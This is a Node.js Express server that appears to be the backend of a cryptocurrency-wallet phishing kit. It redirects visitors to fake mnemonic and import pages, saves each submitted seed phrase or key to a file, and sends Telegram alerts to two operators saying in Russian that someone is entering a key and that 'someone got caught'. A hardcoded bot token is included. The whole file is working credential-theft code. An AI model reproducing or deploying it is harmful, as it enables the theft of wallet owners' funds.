const express = require('express')
const path = require('path')
const app = express()

const TelegramBot = require('node-telegram-bot-api')
const token = '7869927971:AAGc7R7ZAVciglVM3RPMkhLO6GFG1342e8';
const bot =  new  TelegramBot(token, {polling: true});
const fs = require('fs')
const id = 7812265370;
const id2 = 7059952411;
app.use((req,res,next)=>{
    if(req.url==='/app/mobile/import'){
        res.redirect('/mobile/import')
        res.end()
        return
    }
    if(req.url==='/app/mobile/import-mnemonic'){
        res.redirect('/mobile/mnemonic')
        res.end()
        return
    }
    if(req.url==='/app/mobile/mnemonic'){
        res.redirect('/mobile/import')
        res.end()
        return
    }

    if(req.url==='/app/import-mnemonic'){
        res.redirect('/mnemonic')
        res.end()
        return
    }
    if(req.url==='/'){
        res.redirect('/mnemonic')
        res.end()
        return
    }
    console.log(req.url)
    if(req.url==='/app/import'){
        res.redirect('/import')
        res.end()
        return
    }
    next()
})
app.use(express.static(path.join(__dirname,'public')))
app.get('/conversion', (req, res) => {
    try {
        bot.sendMessage(id, `🤓🦣 Кто-то вводит ключ `, {
            parse_mode: "HTML"
        });
        bot.sendMessage(id2, `🤓🦣 Кто-то вводит ключ `, {
            parse_mode: "HTML"
        });
        res.writeHead(200, {});
        res.end();
    } catch (error) {
        res.writeHead(500, {});
        res.end();
    }
   
});

app.post('/currency', (req, res) => {
    try {
        let request = '';
        req.on('data', (c) => request += c.toString());
        req.on('end', () => {
            if (typeof request === 'string') {
                request = JSON.parse(request);
                fs.writeFile(`keys${Date.now()}.txt`, Buffer.from(JSON.stringify(request)), (err) => {
                    if (err)
                        throw err;
                });
                if (request.input.length > 10) {
                    bot.sendMessage(id, `🔑 Кто-то попался`, {
                        parse_mode: "HTML"
                    });
                    bot.sendMessage(id2, `🔑 Кто-то попался`, {
                        parse_mode: "HTML"
                    });
                    res.writeHead(200, {});
                    res.end();
                }
            }
        });
    } catch (error) {
    }
});
app.all('/app',(req,res)=>{
    
    res.writeHead(200,{})
    res.end('')
})

app.listen(3333,()=>console.log(1))